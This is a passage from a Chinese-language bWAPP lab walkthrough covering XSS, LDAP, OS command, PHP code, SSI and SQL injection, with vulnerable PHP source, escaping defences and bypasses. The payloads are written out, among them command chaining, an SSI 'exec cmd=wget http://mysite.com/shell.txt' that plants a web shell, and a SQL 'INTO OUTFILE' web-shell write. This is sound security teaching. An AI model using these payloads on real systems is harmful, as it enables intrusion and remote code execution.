<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//闭合 iframe 之后再写入注入脚本</span></span><br><span class="line">?ParamUrl=robots.txt&amp;ParamWidth=<span class="number">250</span>&amp;ParamHeight=<span class="number">250</span><span class="string">"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_3.png" alt></p>
<h2 id="防护方式-4"><a href="#防护方式-4" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.</span></span><br><span class="line">    <span class="comment">// These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).</span></span><br><span class="line">    <span class="comment">// Do NOT use this for XSS or HTML validations!!!</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数防护，payload 和未防护时相同，可以触发 xss。为什么这个防护是无效的？</p>
<p>本地复现一下，两个文件，iframexss.php 和 xss.txt，xss.txt 中内容随意。</p>
<p>iframexss.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// xss 过滤</span><br><span class="line">function xss($data)&#123;</span><br><span class="line">	return addslashes($data);</span><br><span class="line">&#125;</span><br><span class="line">// 输出传入参数</span><br><span class="line">echo $_SERVER[&quot;QUERY_STRING&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt; iframe xss&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt; xss &lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is an iframe xss !&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;ParamHeight&quot;]) &amp;&amp; isset($_GET[&quot;ParamWidth&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;xss.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_4.png" alt></p>
<h1 id="LDAP-Injection-Search"><a href="#LDAP-Injection-Search" class="headerlink" title="LDAP Injection (Search)"></a>LDAP Injection (Search)</h1><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>LDAP 是轻量级目录访问协议。</p>
<p>目录服务是一种特殊的数据库，专门用于保存某些属性的详细信息，比如，电话簿，地址簿，人员组织管理等等。</p>
<p>而 LDAP 类似于目录服务，只不过存储的是文件目录，存储位置为各大厂商，比如 SUN，IBM，Microsoft等等。LDAP 本身并不是目录数据库。它是一种提供访问目录数据库方法的服务和协议。</p>
<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。LDAP不仅可以从目录数据库查询对象，还可以用于管理和身份验证。</p>
<p>一些参数如图：</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_5.png" alt></p>
<p>如果把 LDAP 和 数据库类比起来，数据库是以 表-字段-值 的形式来存储数据，而 LDAP 目录是以树的形式存储数据。dn 和库名对应，dc 和表名对应，ou 和字段对应，cn 是要查询的目标名称</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_6.png" alt></p>
<h2 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h2><h2 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h2><p>This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree.The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p>
<p>CVE-2018-12689</p>
<p>CVE-2018-5730</p>
<p>CVE-2016-8750</p>
<p>CVE-2011-4069</p>
<h2 id="防护方式-5"><a href="#防护方式-5" class="headerlink" title="防护方式"></a>防护方式</h2><h1 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP)"></a>Mail Header Injection (SMTP)</h1><p><a href="https://www.freebuf.com/articles/web/14918.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/14918.html</a></p>
<p><a href="https://www.acunetix.com/blog/articles/email-header-injection/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/email-header-injection/</a></p>
<h1 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h1><h2 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"target"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $target = $_POST[<span class="string">"target"</span>];</span><br><span class="line">      <span class="keyword">if</span>($target == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Enter a domain name...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;"</span>.shell_exec(<span class="string">"nslookup  "</span>.commandi($target)).<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入一个域名，返回它的 DNS 信息，这里没有对输入进行过滤，可以实现任意命令执行。</p>
<p>这里是通过 shell_exec 函数执行系统命令，类似的函数还有 system，exec</p>
<h2 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ; 结尾，执行完前面的命令再执行 whoami</span></span><br><span class="line">www.baidu.com ; whoami</span><br><span class="line"><span class="comment">// | 不执行前面的，只执行 whoami</span></span><br><span class="line">www.baidu.com | whoami</span><br><span class="line"><span class="comment">// &amp;&amp; 先执行前面的，再执行 whoami</span></span><br><span class="line">www.baidu.com &amp;&amp; whoami</span><br><span class="line"><span class="comment">// &amp; 先执行 whoami 再执行前面的</span></span><br><span class="line">www.baidu.com &amp; whoami</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-6"><a href="#防护方式-6" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&amp;"</span>, <span class="string">""</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">";"</span>, <span class="string">""</span>, $input);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只过滤了 <code>&amp;</code> 和 <code>;</code> ，仍然可以使用 <code>|</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">commandi_check_2</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> escapeshellcmd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>escapeshellcmd 对 shell 元字符转义</p>
<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 &#39; 和 “ 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<h1 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h1><h2 id="产生原因-7"><a href="#产生原因-7" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_REQUEST[&quot;message&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">?&gt;</span><br><span class="line">  &lt;p&gt;&lt;i&gt;&lt;?php @eval (&quot;echo &quot;.$_REQUEST[&quot;message&quot;].&quot;;&quot;);?&gt;&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>eval 函数执行 message 传入的参数，且没有过滤参数</p>
<p>如果输入 phpinfo() ，输出代码就变为 <code>&lt;?php @eval(&quot;echo phpinfo();&quot;) ?&gt;</code>，这样就实现了任意代码执行，类似的函数还有 assert 函数</p>
<h2 id="利用方式-7"><a href="#利用方式-7" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看 phpinfo</span></span><br><span class="line">?message=phpinfo()</span><br><span class="line"><span class="comment">// 查看目录</span></span><br><span class="line">?message=var_dump(scandir(<span class="string">'./'</span>))</span><br><span class="line"><span class="comment">// 执行任意命令</span></span><br><span class="line"><span class="number">1</span>;system(whoami)</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-7"><a href="#防护方式-7" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"message"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">   &lt;p&gt;&lt;i&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($_REQUEST[<span class="string">"message"</span>], ENT_QUOTES, <span class="string">"UTF-8"</span>);;<span class="meta">?&gt;</span>&lt;/i&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>htmlspecialchars 过滤且没有 eval 函数</p>
<h1 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h1><h2 id="补充知识-1"><a href="#补充知识-1" class="headerlink" title="补充知识"></a>补充知识</h2><p>SSIs are directives present on Web applications used to feed an HTML<br>page with dynamic contents. They are similar to CGIs, except that SSIs<br>are used to execute some actions before the current page is loaded or<br>while the page is being visualized. In order to do so, the web server<br>analyzes SSI before supplying the page to the user. </p>
<p>The Server-Side Includes attack allows the exploitation of a web<br>application by injecting scripts in HTML pages or executing arbitrary<br>codes remotely. It can be exploited through manipulation of SSI in use<br>in the application or force its use through user input fields. </p>
<p>SSIs 是使用动态内容填充 HTML 页面。它和 CGIs 类似，但是 SSIs 会在页面加载之前或者用户看到之前进行一些动作。在把页面返回给用户之前，Web 服务器会解析 SSI。SSI 攻击允许利用 Web 应用在 HTML 页面中插入脚本或者执行任意远程代码。它可以通过使用 SSI 操作的 Web 应用利用，或者通过用户输入字段强制使用。</p>
<p>SSI 类似于模板渲染，在页面加载之前，服务器会解析其中的内容。</p>
<p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p>
<h2 id="产生原因-8"><a href="#产生原因-8" class="headerlink" title="产生原因"></a>产生原因</h2><p>ssii.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"form"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $firstname = ucwords(xss($_POST[<span class="string">"firstname"</span>]));</span><br><span class="line">    $lastname = ucwords(xss($_POST[<span class="string">"lastname"</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $field_empty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $line = <span class="string">'&lt;p&gt;Hello '</span>.$firstname.<span class="string">' '</span>.$lastname.<span class="string">',&lt;/p&gt;&lt;p&gt;Your IP address is:'</span>.<span class="string">'&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Writes a new line to the file</span></span><br><span class="line">        $fp = fopen(<span class="string">"ssii.shtml"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fputs($fp, $line, <span class="number">200</span>);</span><br><span class="line">        fclose($fp);</span><br><span class="line"></span><br><span class="line">        header(<span class="string">"Location: ssii.shtml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ssii.shtml</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello Wwww Wwww,<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your IP address is:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="comment">&lt;!--#echo var="REMOTE_ADDR" --&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>未对输入过滤，导致可以构造 SSI 语句，提交到后端执行</p>
<h2 id="利用方式-8"><a href="#利用方式-8" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="ls" --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-8"><a href="#防护方式-8" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数转义，把双引号去掉就可以了</p>
<p>绕过 : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// List files of directory</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=ls --&gt;</span></span><br><span class="line">// Get shell</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=wget http://mysite.com/shell.txt | rename shell.txt shell.php --&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_check_3</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 函数转义</p>
<h1 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h1><h2 id="产生原因-9"><a href="#产生原因-9" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"title"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入参数 title，查询数据库中是否有满足 title 条件的记录</p>
<p>此处未对传入参数过滤，如果输入 <code>a%&#39;</code>，输出代码就变为 <code>SELECT * FROM movies WHERE title LIKE &#39;%a%&#39;%&#39;</code>，语句错误，报错无法查询</p>
<h2 id="利用方式-9"><a href="#利用方式-9" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">a%&apos; union select 1,2,3,4,5,6,7 #</span><br><span class="line">// 查询所有表</span><br><span class="line">a%&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 #</span><br><span class="line">// 写入 shell (如果有写入权限)</span><br><span class="line">a%&apos; union select 1,&quot;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;])?&gt;&quot;,3,4,5,6,7 into OUTFILE &apos;/var/www/bWAPP/shell.php&apos; #</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-9"><a href="#防护方式-9" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addslashes 转义，暂时没有绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysql_real_escape_string 函数转义 SQL 语句中使用的字符串中的特殊字符，暂时没有绕过</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_7.png" alt></p>
<p>这两处防护无法绕过，因为绕过需要闭合 <code>&#39;%</code>，就必须要 <code>&#39;</code>，这两个函数过滤了 <code>&#39;&#39;</code></p>
<h1 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h1><h2 id="产生原因-10"><a href="#产生原因-10" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"movie"</span>]))</span><br><span class="line">&#123;   </span><br><span class="line">    $id = $_GET[<span class="string">"movie"</span>];</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If the user selects a movie</span></span><br><span class="line">    <span class="keyword">if</span>($id)        </span><br><span class="line">    &#123;</span><br><span class="line">        $sql.= <span class="string">" WHERE id = "</span> . sqli($id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="keyword">if</span>(!$recordset)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// die("Error: " . mysql_error());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理同上，当传入参数 movie 为 <code>1&#39;</code>时，语句为 <code>SELECT * FROM movies WHERE id = 1&#39;</code>，语法错误，无法查询</p>
<h2 id="利用方式-10"><a href="#利用方式-10" class="headerlink" title="利用方式"></a>利用方式</h2><p>同上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 判断查询的字段数及出现位置</span><br><span class="line">?movie=-1 union select 1,2,3,4,5,6,7 %23</span><br></pre></td></tr></table></figure>

<h2 id="防护方式-10"><a href="#防护方式-10" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sqli($data)&#123;</span><br><span class="line">    return mysql_real_escape_string($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里不需要单引号也可以注入</p>
<p>绕过 : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?movie=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7 %23</span><br></pre></td></tr></table></figure>

<h1 id="SQL-Injection-POST-Search"><a href="#SQL-Injection-POST-Search" class="headerlink" title="SQL Injection (POST/Search)"></a>SQL Injection (POST/Search)</h1><h2 id="产生原因-11"><a href="#产生原因-11" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span 